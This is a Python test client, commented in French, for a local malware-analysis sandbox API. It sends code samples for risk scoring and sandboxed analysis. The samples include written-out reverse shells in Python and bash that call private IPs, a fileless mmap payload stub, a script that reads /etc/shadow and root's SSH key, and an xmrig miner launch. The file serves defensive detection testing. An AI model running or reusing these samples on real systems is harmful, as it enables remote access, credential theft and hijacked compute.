#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Jun 21 16:55:40 2026

@author: hounsousamuel
"""

import os
import sys
import json
import asyncio
import aiohttp
import time
from datetime import datetime
from typing import Optional, Dict, Any

# =============================================================================
# CONFIGURATION
# =============================================================================

API_BASE_URL = "http://localhost:8100"
API_PREFIX = "/api"

# Échantillons de code pour les tests
SAMPLES = {
    "benign": {
        "name": "Code bénin",
        "code": """
def add(a, b):
    return a + b

if __name__ == "__main__":
    print(f"Résultat: {add(5, 3)}")
"""
    },
    "reverse_shell": {
        "name": "Reverse shell Python",
        "code": """
#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.100", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    reverse_shell()
"""
    },
    "bash_reverse": {
        "name": "Bash reverse shell",
        "code": """#!/bin/bash
exec 5<>/dev/tcp/10.0.0.1/8080
cat <&5 | while read line; do $line 2>&5 >&5; done
"""
    },
    "fileless": {
        "name": "Fileless payload",
        "code": """
#!/usr/bin/env python3
import ctypes
import mmap
import base64

shellcode = base64.b64decode("SGVsbG8gV29ybGQh")
mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
mem.write(shellcode)
ctypes.CDLL(None).execve(mem, [], [])
"""
    },
    "credential_theft": {
        "name": "Credential theft",
        "code": """
#!/usr/bin/env python3
import os
import subprocess

def steal_credentials():
    with open("/etc/shadow", "r") as f:
        print(f.read())
    with open("/etc/passwd", "r") as f:
        print(f.read())
    subprocess.run(["cat", "/root/.ssh/id_rsa"])

if __name__ == "__main__":
    steal_credentials()
"""
    },
    "cryptominer": {
        "name": "Cryptominer",
        "code": """
#!/usr/bin/env python3
import requests
import subprocess

config = {
    "url": "stratum+ssl://pool.supportxmr.com:443",
    "user": "4Bk...",
    "pass": "x"
}

subprocess.Popen(["xmrig", "-o", config["url"], "-u", config["user"], "-p", config["pass"]])
"""
    }
}


# =============================================================================
# CLASSE DE TEST
# =============================================================================

class SandboxAPITester:
    """Testeur de l'API Sandbox ShieldAI."""
    
    def __init__(self, base_url: str = API_BASE_URL):
        self.base_url = base_url
        self.api_url = f"{base_url}{API_PREFIX}"
        self.results = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.colors = {
            "green": "\033[92m",
            "red": "\033[91m",
            "yellow": "\033[93m",
            "blue": "\033[94m",
            "reset": "\033[0m",
            "bold": "\033[1m"
        }
    
    def print_header(self, text: str):
        """Affiche un en-tête."""
        print("\n" + "=" * 70)
        print(f"{self.colors['bold']}{self.colors['blue']}{text}{self.colors['reset']}")
        print("=" * 70)
    
    def print_result(self, success: bool, message: str):
        """Affiche un résultat de test."""
        icon = "✅" if success else "❌"
        color = self.colors["green"] if success else self.colors["red"]
        print(f"  {color}{icon} {message}{self.colors['reset']}")
    
    def print_json(self, data: dict, max_length: int = 500):
        """Affiche un JSON formaté."""
        output = json.dumps(data, indent=2, ensure_ascii=False)
        if len(output) > max_length:
            output = output[:max_length] + "... (tronqué)"
        print(output)
    
    # =========================================================================
    # TESTS
    # =========================================================================
    
    async def test_health(self):
        """Test GET /api/status/health."""
        self.print_header("🧪 TEST: Health check")
        
        try:
            async with self.session.get(f"{self.api_url}/status/health") as resp:
                data = await resp.json()
                success = resp.status == 200
                self.print_result(success, f"Health check: {resp.status}")
                if success:
                    print(f"    Status: {data.get('status')}")
                    print(f"    Container: {data.get('container_status')}")
                return success
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False
    
    async def test_languages(self):
        """Test GET /api/languages."""
        self.print_header("🧪 TEST: Langages supportés")
        
        try:
            async with self.session.get(f"{self.api_url}/languages") as resp:
                data = await resp.json()
                success = resp.status == 200
                self.print_result(success, f"Langages: {resp.status}")
                if success:
                    langs = data.get('languages', [])
                    print(f"    {len(langs)} langages supportés:")
                    print(f"    {', '.join(langs[:10])}...")
                return success
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False
    
    async def test_config(self):
        """Test GET /api/config."""
        self.print_header("🧪 TEST: Configuration du sandbox")
        
        try:
            async with self.session.get(f"{self.api_url}/config") as resp:
                data = await resp.json()
                success = resp.status == 200
                self.print_result(success, f"Config: {resp.status}")
                if success:
                    print(f"    Image: {data.get('image_name')}")
                    print(f"    Mémoire: {data.get('mem_limit')}")
                    print(f"    Timeout: {data.get('exec_timeout')}s")
                    print(f"    Seuil: {data.get('alert_threshold')}")
                return success
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False
    
    async def test_estimate_risk(self, code: str, sample_name: str):
        """Test POST /api/estimate_risk."""
        self.print_header(f"🧪 TEST: Estimation de risque - {sample_name}")
        
        data = aiohttp.FormData()
        data.add_field("code", code)
        
        try:
            async with self.session.post(
                f"{self.api_url}/estimate_risk",
                data=data
            ) as resp:
                result = await resp.json()
                success = resp.status == 200
                
                self.print_result(success, f"Estimation: {resp.status}")
                if success:
                    print(f"    Score: {result.get('risk_score')}/100")
                    print(f"    Niveau: {result.get('risk_level')}")
                    print(f"    Sandbox recommandé: {result.get('recommend_sandbox')}")
                    if result.get('flags'):
                        print(f"    Flags: {', '.join(result['flags'][:3])}...")
                return success, result
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False, {}
    
    async def test_analyze_code(self, code: str, sample_name: str, language: str = None):
        """Test POST /api/analyse_code."""
        self.print_header(f"🧪 TEST: Analyse complète - {sample_name}")
        
        data = aiohttp.FormData()
        data.add_field("code", code)
        if language:
            data.add_field("language", language)
        
        # Configuration personnalisée
        config = {
            "exec_timeout": 30.0,
            "mem_limit": "256m",
            "alert_threshold": 60,
            "enable_strace": True,
            "enable_fs_monitor": True,
        }
        data.add_field("config_str", json.dumps(config))
        data.add_field("use_cache", "1")
        
        try:
            start = time.time()
            async with self.session.post(
                f"{self.api_url}/analyse_code",
                data=data
            ) as resp:
                result = await resp.json()
                elapsed = time.time() - start
                success = resp.status == 200
                
                self.print_result(success, f"Analyse: {resp.status} ({elapsed:.2f}s)")
                if success:
                    print(f"    Session: {result.get('session_id')}")
                    print(f"    Score: {result.get('final_score')}/100")
                    print(f"    Niveau: {result.get('final_level')}")
                    print(f"    Alertes: {result.get('alerts_count')}")
                    print(f"    Container tué: {result.get('killed')}")
                    print(f"    Durée: {result.get('session_duration'):.2f}s")
                    
                    if result.get('alerts'):
                        print(f"    Alertes: {len(result.get('alerts', []))}")
                        for alert in result.get('alerts', [])[:3]:
                            print(f"      - {alert.get('threat_level')}: {alert.get('pattern_detected', 'N/A')}")
                return success, result
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False, {}
    
    async def test_analyze_file_upload(self, file_path: str):
        """Test POST /api/analyse_code avec upload de fichier."""
        self.print_header(f"🧪 TEST: Upload de fichier - {os.path.basename(file_path)}")
        
        if not os.path.exists(file_path):
            self.print_result(False, f"Fichier non trouvé: {file_path}")
            return False, {}
        
        try:
            with open(file_path, "r") as f:
                code = f.read()
            
            # Utiliser la même méthode que test_analyze_code
            return await self.test_analyze_code(code, os.path.basename(file_path))
            
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False, {}
    
    async def test_container_status(self):
        """Test GET /api/status/container."""
        self.print_header("🧪 TEST: État du container")
        
        try:
            async with self.session.get(f"{self.api_url}/status/container") as resp:
                data = await resp.json()
                success = resp.status == 200
                self.print_result(success, f"Container: {resp.status}")
                if success:
                    print(f"    Status: {data.get('status')}")
                    print(f"    PID: {data.get('pid')}")
                    print(f"    Sain: {data.get('healthy')}")
                    print(f"    Image: {data.get('image_name')}")
                return success
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False
    
    async def test_help(self):
        """Test GET /api/help."""
        self.print_header("🧪 TEST: Documentation")
        
        try:
            async with self.session.get(f"{self.api_url}/help") as resp:
                data = await resp.json()
                success = resp.status == 200
                self.print_result(success, f"Help: {resp.status}")
                if success:
                    endpoints = data.get('endpoints', {})
                    print(f"    {len(endpoints)} endpoints disponibles")
                    print(f"    Rate limit: {data.get('rate_limit')}")
                return success
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False
    
    async def test_rate_limit_status(self):
        """Test GET /api/rate-limit-status."""
        self.print_header("🧪 TEST: Rate limit status")
        
        try:
            async with self.session.get(f"{self.api_url}/rate-limit-status") as resp:
                data = await resp.json()
                success = resp.status == 200
                self.print_result(success, f"Rate limit: {resp.status}")
                if success:
                    print(f"    IP: {data.get('ip')}")
                    print(f"    Limite: {data.get('limit')}")
                return success
        except Exception as e:
            self.print_result(False, f"Erreur: {e}")
            return False
    
    # =========================================================================
    # EXÉCUTION DES TESTS
    # =========================================================================
    
    async def run_all_tests(self, create_temp_file: bool = True):
        """Exécute tous les tests."""
        print("\n" + "=" * 70)
        print(f"{self.colors['bold']}{self.colors['blue']}🚀 LANCEMENT DES TESTS API SANDBOX{self.colors['reset']}")
        print("=" * 70)
        print(f"📡 API: {self.api_url}")
        print(f"🕐 Début: {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}")
        print("=" * 70)
        
        total = 0
        passed = 0
        
        async with aiohttp.ClientSession() as session:
            self.session = session
            
            # 1. Tests de base
            total += 1
            if await self.test_help():
                passed += 1
            
            total += 1
            if await self.test_health():
                passed += 1
            
            total += 1
            if await self.test_languages():
                passed += 1
            
            total += 1
            if await self.test_config():
                passed += 1
            
            total += 1
            if await self.test_container_status():
                passed += 1
            
            total += 1
            if await self.test_rate_limit_status():
                passed += 1
            
            # 2. Tests d'estimation de risque
            for key, sample in SAMPLES.items():
                total += 1
                success, _ = await self.test_estimate_risk(sample["code"], sample["name"])
                if success:
                    passed += 1
            
            # 3. Tests d'analyse complète (sur les échantillons critiques)
            critical_samples = ["reverse_shell", "bash_reverse", "fileless"]
            for key in critical_samples:
                if key in SAMPLES:
                    sample = SAMPLES[key]
                    total += 1
                    language = "python" if key != "bash_reverse" else "bash"
                    success, _ = await self.test_analyze_code(
                        sample["code"], 
                        sample["name"], 
                        language=language
                    )
                    if success:
                        passed += 1
            
            # 4. Analyse du code bénin
            if "benign" in SAMPLES:
                sample = SAMPLES["benign"]
                total += 1
                success, _ = await self.test_analyze_code(
                    sample["code"],
                    sample["name"],
                    language="python"
                )
                if success:
                    passed += 1
            
            # 5. Test d'upload de fichier (crée un fichier temporaire)
            if create_temp_file:
                temp_file = "/tmp/test_sandbox_script.py"
                with open(temp_file, "w") as f:
                    f.write(SAMPLES["reverse_shell"]["code"])
                
                total += 1
                success, _ = await self.test_analyze_file_upload(temp_file)
                if success:
                    passed += 1
                
                # Nettoyer
                if os.path.exists(temp_file):
                    os.unlink(temp_file)
        
        # =========================================================================
        # RÉSUMÉ
        # =========================================================================
        
        print("\n" + "=" * 70)
        print(f"{self.colors['bold']}📊 RÉSUMÉ DES TESTS{self.colors['reset']}")
        print("=" * 70)
        print(f"  ✅ Passés: {self.colors['green']}{passed}{self.colors['reset']}")
        print(f"  ❌ Échoués: {self.colors['red']}{total - passed}{self.colors['reset']}")
        print(f"  📊 Total: {total}")
        print(f"  🎯 Taux de réussite: {passed/total*100:.1f}%")
        print(f"  🕐 Fin: {datetime.now().strftime('%d/%m/%Y à %H:%M:%S')}")
        print("=" * 70)
        
        return {
            "total": total,
            "passed": passed,
            "failed": total - passed,
            "rate": f"{passed/total*100:.1f}%"
        }


# =============================================================================
# MAIN
# =============================================================================

async def main():
    """Point d'entrée principal."""
    tester = SandboxAPITester()
    
    try:
        # Vérifier que l'API est accessible
        import aiohttp
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{tester.api_url}/help") as resp:
                    if resp.status != 200:
                        print(f"⚠️ API non accessible sur {tester.api_url}")
                        print("   Vérifie que l'API est lancée:")
                        print("   python3 -m sandbox_ia.api.run_api")
                        return
        except aiohttp.ClientConnectorError:
            print(f"❌ Impossible de se connecter à l'API sur {tester.api_url}")
            print("   Vérifie que l'API est lancée:")
            print("   python3 -m sandbox_ia.api.run_api")
            return
        
        # Lancer les tests
        results = await tester.run_all_tests(create_temp_file=True)
        
        print("\n" + "=" * 70)
        print("✅ Tests terminés !")
        print("=" * 70)
        
    except KeyboardInterrupt:
        print("\n⏹️ Tests interrompus par l'utilisateur")
    except Exception as e:
        print(f"❌ Erreur fatale: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    asyncio.run(main())